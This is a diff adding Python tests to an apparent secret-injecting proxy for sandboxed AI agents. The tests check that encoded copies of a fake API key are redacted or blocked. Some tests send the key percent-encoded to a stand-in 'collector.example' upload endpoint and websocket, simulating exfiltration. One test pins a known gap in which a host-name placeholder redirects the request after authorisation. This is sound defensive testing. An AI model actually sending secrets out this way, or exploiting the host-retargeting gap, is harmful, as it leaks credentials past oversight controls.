@@ -23,7 +23,7 @@ import asyncio
 import collections
 import json
 import sys
-from urllib.parse import urlsplit
+from urllib.parse import quote, quote_plus, unquote, unquote_plus, urlsplit
 from unittest.mock import MagicMock
 
 import pytest
@@ -457,3 +457,255 @@ class TestAuditFunnel:
         addon._audit_write(dict(record))
         [entry] = _audit(addon, tmp_path, capsys)
         assert {k: entry[k] for k in record} == record
+
+
+# ── Encoded forms of a secret (0a.32) ────────────────────
+#
+# Redaction matched each secret's literal bytes only, so a secret spelled
+# another way (percent-encoded, JSON-escaped, base64) reached the cage,
+# capture.jsonl and the audit sinks, and passed the policy check. See
+# tests/test_secret_injector_encoded.py for each encoding on its own.
+
+# Characters each encoder treats differently.
+_ENC_REAL = "sk+FAKE/enc=0123456789&abcdef~ghij"
+_ENC_PCT = quote(_ENC_REAL, safe="")
+
+
+def _php_json(value: str) -> str:
+    """The JSON string body PHP's json_encode writes (``/`` escaped)."""
+    return json.dumps(value)[1:-1].replace("/", "\\/")
+
+
+def _recoverable(text: str, secret: str = _ENC_REAL) -> bool:
+    """Whether *secret* can be read back out of *text* by undoing one of
+    the encodings (percent, form, JSON string escapes)."""
+    candidates = [text, unquote(text), unquote_plus(text),
+                  text.replace("\\/", "/").encode("ascii", "backslashreplace")
+                  .decode("unicode_escape")]
+    return any(secret in c for c in candidates)
+
+
+def _strings(value):
+    """Every string in JSON-shaped *value*, at any depth."""
+    if isinstance(value, str):
+        yield value
+    elif isinstance(value, dict):
+        for v in value.values():
+            yield from _strings(v)
+    elif isinstance(value, list):
+        for v in value:
+            yield from _strings(v)
+
+
+def _assert_clean(record, secret: str = _ENC_REAL) -> None:
+    for s in _strings(record):
+        assert not _recoverable(s, secret), s
+
+
+def _capture(tmp_path) -> list[dict]:
+    """The capture entries, after checking none holds the secret in any
+    spelling."""
+    path = tmp_path / "capture.jsonl"
+    entries = [json.loads(line) for line in path.read_text().splitlines()]
+    for entry in entries:
+        _assert_clean(entry)
+    return entries
+
+
+def _serializable_block_response(addon_mod, monkeypatch):
+    """Make the addon's synthesized 403 a response the capture writer can
+    serialize (the conftest stub's ``http.Response.make`` returns a
+    MagicMock, which is not JSON)."""
+    addon_http = addon_mod.Agentcage.request.__globals__["http"]
+
+    def make(status, content=b"", headers=None):
+        resp = MagicMock()
+        resp.status_code = status
+        resp.reason = "Forbidden"
+        resp.http_version = "HTTP/1.1"
+        resp.headers = _Headers(dict(headers or {}))
+        resp.content = content
+        return resp
+
+    monkeypatch.setattr(addon_http.Response, "make", make)
+
+
+def _enc_addon(addon_mod, tmp_path, **kw):
+    kw.setdefault("rules", [_rule(addon_mod, real_value=_ENC_REAL,
+                                  inject_body=True)])
+    return _addon(addon_mod, tmp_path, capture=True, **kw)
+
+
+class TestEncodedSecretForms:
+    def test_server_echo_redacted_for_cage_and_capture(
+            self, addon_mod, tmp_path, capsys):
+        """The server echoes the URL it was sent with the injected value
+        percent-encoded, in a redirect and (JSON-escaped the way PHP
+        writes it) in the body: the cage, the capture and the audit log
+        see the placeholder, in the same encoding."""
+        addon = _enc_addon(addon_mod, tmp_path, log_allowed=True)
+        flow = _flow(f"https://{_HOST}/v1/data?key={_PH}&q=1")
+        _run(addon.request(flow))
+        assert flow.request.path == f"/v1/data?key={_ENC_REAL}&q=1"
+        moved = f"https://{_HOST}/v2/data?key={_ENC_PCT}&q=1"
+        _respond(flow, status=302, headers={
+            "Content-Type": "application/json", "Location": moved,
+        }, body=json.dumps({"moved": moved}).replace("/", "\\/").encode())
+        _run(addon.response(flow))
+
+        # What reaches the cage.
+        ph_moved = f"https://{_HOST}/v2/data?key=%7B%7BAPI_KEY%7D%7D&q=1"
+        assert flow.response.headers["Location"] == ph_moved
+        assert json.loads(flow.response.content) == {"moved": ph_moved}
+        # The capture's request and response, both perspectives.
+        [entry] = _capture(tmp_path)
+        assert json.loads(entry["outbound"]["response"]["body"]) == {
+            "moved": ph_moved}
+        # The audit entry.
+        [audited] = _audit(addon, tmp_path, capsys, secret=_ENC_REAL)
+        _assert_clean(audited)
+
+    def test_response_inspector_quoting_an_escaped_echo(
+            self, addon_mod, tmp_path, capsys, monkeypatch):
+        _serializable_block_response(addon_mod, monkeypatch)
+        addon = _enc_addon(
+            addon_mod, tmp_path,
+            inspectors=[_Inspector(
+                "block", lambda ctx: f"suspicious body: {ctx.body_text}",
+                on="response")],
+        )
+        flow = _flow(f"https://{_HOST}/v1/data",
+                     headers={"Authorization": f"Bearer {_PH}"})
+        _run(addon.request(flow))
+        _respond(flow, body=f'{{"you_sent": "{_php_json(_ENC_REAL)}"}}'
+                 .encode())
+        _run(addon.response(flow))
+
+        # The 403 the cage gets quotes the reason, JSON-encoded again.
+        assert json.loads(flow.response.content)["reason"] == (
+            'suspicious body: {"you_sent": "{{API_KEY}}"}')
+        entries = _audit(addon, tmp_path, capsys, secret=_ENC_REAL)
+        blocked = entries[-1]
+        assert blocked["secrets_redacted"] == ["API_KEY"]
+        assert blocked["decision"] == "blocked"
+        assert blocked["reason"] == (
+            'suspicious body: {"you_sent": "{{API_KEY}}"}')
+        _assert_clean(entries)
+        _capture(tmp_path)
+
+    def test_percent_encoded_value_to_inject_to_host(
+            self, addon_mod, tmp_path, capsys):
+        """The cage sends the real value percent-encoded, in the query and
+        a form body, to a host in inject_to: allowed like the literal,
+        recorded as the placeholder in the audit log and both capture
+        perspectives."""
+        addon = _enc_addon(addon_mod, tmp_path, log_allowed=True)
+        form = f"key={quote_plus(_ENC_REAL, safe='')}&x=1".encode()
+        flow = _flow(f"https://{_HOST}/v1/data?key={_ENC_PCT}", body=form)
+        _run(addon.request(flow))
+        assert not flow.metadata.get("agentcage_blocked")
+        _respond(flow)
+        _run(addon.response(flow))
+
+        [audited] = _audit(addon, tmp_path, capsys, secret=_ENC_REAL)
+        assert audited["decision"] == "allowed"
+        assert audited["url"] == (
+            f"https://{_HOST}/v1/data?key=%7B%7BAPI_KEY%7D%7D")
+        [entry] = _capture(tmp_path)
+        for side in ("inbound", "outbound"):
+            assert entry[side]["request"]["body"] == (
+                "key=%7B%7BAPI_KEY%7D%7D&x=1")
+
+    def test_percent_encoded_value_elsewhere_blocked(
+            self, addon_mod, tmp_path, capsys, monkeypatch):
+        _serializable_block_response(addon_mod, monkeypatch)
+        """To a host outside inject_to it is blocked like the literal, and
+        the blocked request is recorded redacted."""
+        addon = _enc_addon(addon_mod, tmp_path)
+        flow = _flow(f"https://collector.example/upload?d={_ENC_PCT}")
+        _run(addon.request(flow))
+        assert flow.metadata.get("agentcage_blocked") is True
+
+        [audited] = _audit(addon, tmp_path, capsys, secret=_ENC_REAL)
+        assert audited["decision"] == "blocked"
+        assert audited["reason"] == (
+            "literal secret value API_KEY found in outbound request to "
+            "collector.example")
+        _assert_clean(audited)
+        [entry] = _capture(tmp_path)
+        assert entry["decision"] == "blocked"
+
+    def test_websocket_frames(self, addon_mod, tmp_path, capsys):
+        """A frame echoing the value JSON-escaped reaches the cage (and the
+        capture) as the placeholder; a cage frame carrying it
+        percent-encoded to a host outside inject_to is dropped."""
+        addon = _enc_addon(addon_mod, tmp_path, log_allowed=True)
+        flow = _flow("https://collector.example/socket",
+                     headers={"Upgrade": "websocket"})
+        _run(addon.request(flow))
+        _respond(flow, body=b"", status=101, headers={"Upgrade": "websocket"})
+        flow.websocket = MagicMock()
+        flow.websocket.messages = []
+        _run(addon.response(flow))
+
+        def _frame(content: bytes, from_client: bool):
+            msg = MagicMock()
+            msg.content = content
+            msg.from_client = from_client
+            msg.is_text = True
+            flow.websocket.messages.append(msg)
+            _run(addon.websocket_message(flow))
+            return msg
+
+        echo = _frame(f'{{"echo": "{_php_json(_ENC_REAL)}"}}'.encode(), False)
+        assert json.loads(echo.content) == {"echo": _PH}
+        sent = _frame(f"data={_ENC_PCT}".encode(), True)
+        sent.drop.assert_called_once()
+
+        addon.websocket_end(flow)
+        entries = _audit(addon, tmp_path, capsys, secret=_ENC_REAL)
+        assert entries[-1]["decision"] == "blocked"
+        assert entries[-1]["reason"].startswith(
+            "websocket: literal secret value API_KEY")
+        _assert_clean(entries)
+        [entry] = _capture(tmp_path)
+        assert entry["decision"] == "blocked"
+
+
+# ── A placeholder in the host name (current behaviour) ───
+
+
+class TestHostPlaceholder:
+    """Pins current behaviour, not a decision: with ``inject_body``, a
+    placeholder in the host name is authorised against inject_to on the
+    placeholder host (the domain inspector and every other request
+    inspector also saw only that host), then injected, which re-targets
+    the request to a host named by the secret."""
+
+    def test_authorised_on_the_placeholder_host_then_retargeted(
+            self, addon_mod, tmp_path):
+        real = "tenant0a1b2c3d4e5f"
+        seen: list[str] = []
+        addon = _addon(
+            addon_mod, tmp_path,
+            rules=[_rule(addon_mod, name="TENANT", placeholder="{{tenant}}",
+                         real_value=real, inject_to=["example.com"],
+                         inject_body=True)],
+            inspectors=[_Inspector(
+                "allow", lambda ctx: seen.append(ctx.host) or "seen")],
+        )
+        flow = _flow("https://{{tenant}}.example.com/v1/data")
+        _run(addon.request(flow))
+        assert seen == ["{{tenant}}.example.com"]
+        assert flow.request.host == f"{real}.example.com"
+
+    def test_not_injected_outside_inject_to(self, addon_mod, tmp_path):
+        addon = _addon(
+            addon_mod, tmp_path,
+            rules=[_rule(addon_mod, name="TENANT", placeholder="{{tenant}}",
+                         real_value="tenant0a1b2c3d4e5f",
+                         inject_to=["example.com"], inject_body=True)],
+        )
+        flow = _flow("https://{{tenant}}.example.net/v1/data")
+        _run(addon.request(flow))
+        assert flow.request.host == "{{tenant}}.example.net"
